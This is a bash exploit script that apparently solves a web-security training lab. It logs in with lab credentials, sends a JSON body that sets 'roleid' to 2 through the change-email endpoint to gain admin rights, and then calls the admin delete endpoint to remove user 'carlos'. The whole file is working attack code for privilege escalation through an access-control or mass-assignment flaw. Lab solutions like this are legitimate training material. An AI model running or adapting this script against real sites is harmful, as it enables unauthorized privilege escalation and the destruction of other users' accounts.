#!/bin/bash

login() {
    login_page="${url}/login"
    echo "(+) Logging in as user Wiener..."
    export cookie=$(curl -s -c - "${login_page}" -d "username=wiener&password=peter" | awk  '/session/ {print $NF}')
    account="${url}/my-account?id=wiener"
    response=$(curl -s -o /dev/null -b "session="${cookie}"" "${account}" -w "%{http_code}")
    if [[ "${response}" -eq 200 ]]; then
        echo "(+) Logged in successfully."
    else
        echo "(-) Could not login!"
        echo "(-) Exiting"
        exit 1
    fi
}

change_id() {
    change_id_url="${url}/my-account/change-email"
    echo "(+) Changing roleid to 2..."
    change_id_payload='{"email": "test@test.com", "roleid": 2}'
    response=$(curl -s -o /dev/null -w "%{http_code}" -b "session="${cookie}"" "${change_id_url}" -d "${change_id_payload}" )
    if [[ "${response}" == 302 ]]; then
        echo "(+) Changed roleid successfully."
    else
        echo "(-) Could not change the roleid!"
        echo "(-) Exiting..."
        exit 1
    fi
}

delete_user() {
    delete_user="${url}/admin/delete?username=carlos"
    echo "(+) Deleting user Carlos..."
    response=$(curl -s -o /dev/null -w "%{http_code}" -b "session="${cookie}"" "${delete_user}")
    if [[ "${response}" == 302 ]]; then
        echo "(+) Deleted user Carlos successfully!"
    else
        echo "(-) Something went wrong! Could not delete user Carlos."
        echo "(-) Exiting..."
        exit 1
    fi
}

main() {
    if [ $# -ne 1 ]; then
        echo "(+) Usage: $0 website"
        echo "(+) Example: $0 www.example.com"
        exit 1
    fi

    echo "(+) Starting the script..."
    url="$1"
    login "$url"
    change_id "$url"
    delete_user "$url"
}

main "$@"